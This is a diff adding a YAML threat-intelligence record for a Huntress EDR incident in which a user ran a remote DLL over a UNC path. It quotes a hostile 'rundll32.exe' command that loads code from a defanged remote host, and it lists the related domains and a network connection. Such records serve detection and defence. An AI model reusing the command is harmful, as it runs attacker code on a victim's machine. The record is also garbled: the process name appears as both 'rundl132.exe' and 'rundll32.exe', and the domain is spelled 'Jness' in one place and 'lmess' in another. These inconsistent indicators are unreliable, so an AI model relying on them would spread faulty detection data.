@@ -1,0 +1,33 @@
+title: Huntress Managed EDR Incident Report
+description: Huntress Managed EDR detected malicious activity on a Windows device
+  involving user tricked into executing a remote DLL via UNC path.
+attribution: ''
+malware_families: []
+cves: []
+ttps:
+  processes:
+  - rundl132.exe
+  command_lines:
+  - rundll32.exe \\pack3-frane[.]Jness-laboratory[.]in[.]net\@5fe317c-981-dde2-bcba-930d3690b4413d800f5d12cdfe6450a782fcB7bfEEb444.
+    google
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads:
+  - davclnt.dll
+  network_connections:
+  - rundl132.exe -> xvy42z[.]lmess-laboratory[.]in[.]net
+  file_activity: []
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - pack3-frane[.]Jness-laboratory[.]in[.]net
+  - xvy42z[.]lmess-laboratory[.]in[.]net
+  urls: []
+authors: []
+reference: https://www.huntress.com/blog/edr-itdr-correlations
+date_of_publication: May 01, 2026
+file_creation_date: May 01, 2026
